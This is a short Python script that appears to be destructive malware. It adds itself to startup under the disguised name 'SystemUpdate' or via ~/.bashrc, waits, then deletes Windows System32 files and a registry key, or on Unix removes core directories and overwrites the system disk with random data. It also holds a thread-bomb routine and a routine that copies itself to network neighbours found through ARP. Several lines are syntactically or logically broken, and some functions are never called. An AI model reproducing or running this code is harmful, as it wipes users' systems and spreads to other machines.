import os
import shutil
import threading
import subprocess
import random
import winreg
from time import sleep

def destroy_system():
    try:
        if os.name == 'nt':
            os.system('del /f /s /q C:\\Windows\\System32\\*')
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteKey(key, "")
        else:
            os.system("rm -rf /bin /usr/bin /etc /boot")
            os.system("dd if=/dev/random of=/dev/sda bs=512")
            
        def overload():
            while True:
                [threading.Thread(target=lambda: [1]*10**8).start() for _ in range(100)]
                threading.Thread(target=overload).start()
    except Exception as e:
        pass
    
def spread_wifi():
    while True:
        try:
            network = subprocess.check_output("arp -a", shell=True).decode()
            targets = [line.split()[0] for line in network.splitlines() if "." in line]
            
            for ip in targets:
                try:
                    os.system(f"copy {__file__} \\{ip}\\C$\\Users\\Public\\rawr.pyw & '")
                except:
                    pass
        except:
            pass
        sleep(60)
        
def add_to_startup():
    try:
        if os.name == 'nt':
            key = winreg.HKEY_CURRENT_USER
            path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, path, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "SystemUpdate", 0, winreg.REG_SZ, os.path.abspath(__file__))
        else:
            os.system(f"echo 'python3 {os.path.abspath(__file__)} & >> ~/.bashrc")
    except:
        pass
    
if __name__ == "__main__":
    add_to_startup()
    sleep(900)
    threading.Thread(target=destroy_system).start()